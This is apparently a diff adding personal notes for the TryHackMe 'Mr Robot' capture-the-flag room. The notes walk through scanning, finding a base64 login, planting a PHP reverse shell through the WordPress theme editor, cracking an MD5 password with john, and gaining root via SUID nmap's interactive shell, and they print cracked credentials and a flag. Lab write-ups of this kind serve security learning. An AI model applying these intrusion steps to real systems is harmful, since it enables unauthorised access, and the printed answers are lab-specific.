@@ -1,0 +1,137 @@
+room link 
+'''
+https://tryhackme.com/room/mrrobot
+'''
+
+Nmap scan
+
+nmap -sC -sV -sS -O -T4 10.10.16.134
+
+
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 aa:95:6a:27:a4:2e:7b:2f:a0:6a:c9:0b:d9:3b:be:ac (RSA)
+|   256 70:f3:34:15:90:ab:a0:df:c4:c4:c5:57:e7:43:8a:fa (ECDSA)
+|_  256 27:d9:1c:de:7c:ce:2f:21:5c:4e:02:05:40:20:2b:71 (ED25519)
+80/tcp  open  http     Apache httpd
+|_http-server-header: Apache
+|_http-title: Site doesn't have a title (text/html).
+443/tcp open  ssl/http Apache httpd
+
+
+its running a apcahe server 
+running go buster
+
+go buster findings
+gobuster dir -u 10.10.16.134 -w /usr/share/wordlists/dirb/common.txt      
+
+
+after going through the list some unique dirctory what intrests us is robots.txt, login
+
+after visiting to /robots.txt we find
+User-agent: *
+fsocity.dic
+key-1-of-3.txt (our first key ) navigate to /key-1-of-3.txt
+
+
+http://10.10.16.134/license after naviagting to this link and inspecting we get 
+ZWxsaW90OkVSMjgtMDY1Mgo=
+This can be useful as it can be a hex code pr something
+after decoding it we get elliot:ER28-0652
+this is the user ame and password for login
+
+after loging in to the website we logged in as elliot alderson who is an admin
+
+in apearance tab > editor we can upload .php file 
+hence we can use php to get a reverse shell using php
+
+
+http://10.10.16.134/wp-content/themes/twentyfifteen/archive.php
+
+modifying archive .php
+and excuting it
+
+we get a shell 
+
+
+in /home/robot
+we get 
+$ ls
+key-2-of-3.txt
+password.raw-md5
+$ cat key	
+cat: key: No such file or directory
+$ cat key-2-of-3.txt
+cat: key-2-of-3.txt: Permission denied
+$ cat password.raw-md5                        
+robot:c3fcd3d76192e4007dfb496cca67e13b
+
+
+using john to crack the hash
+~/THM/mr.robot> john -format=raw-md5 -wordlist=/usr/share/wordlists/rockyou.txt pass
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-MD5 [MD5 512/512 AVX512BW 16x3])
+Warning: no OpenMP support for this hash type, consider --fork=2
+Press 'q' or Ctrl-C to abort, almost any other key for status
+abcdefghijklmnopqrstuvwxyz (?)     
+1g 0:00:00:00 DONE (2025-10-27 18:03) 20.00g/s 814080p/s 814080c/s 814080C/s promo2007..teletubbies
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed. 
+~/THM/mr.robot> 
+
+
+when we try to switch user we get 
+/home/robot
+$ sudo su
+sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
+
+
+
+we need an interactice shell
+using pyhton to achive that
+
+after logging in as robot user
+su robot
+and getting the second flag
+
+
+
+now for the third flag we need root access
+we can do that by expliting bins that can be run with root privelages
+
+
+
+
+$ find / -perm -4000 2>/dev/null
+/bin/umount
+/bin/mount
+/bin/su
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/bin/pkexec
+/usr/local/bin/nmap
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+$ nmap --interactive
+Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode -- press h <enter> for help
+nmap> !sh
+root@ip-10-10-16-134:/tmp# whoami
+root
+root@ip-10-10-16-134:/root# cat key-3-of-3.txt
+04787ddef27c3dee1ee161b21670b4e4
+
+
+
+
+
+
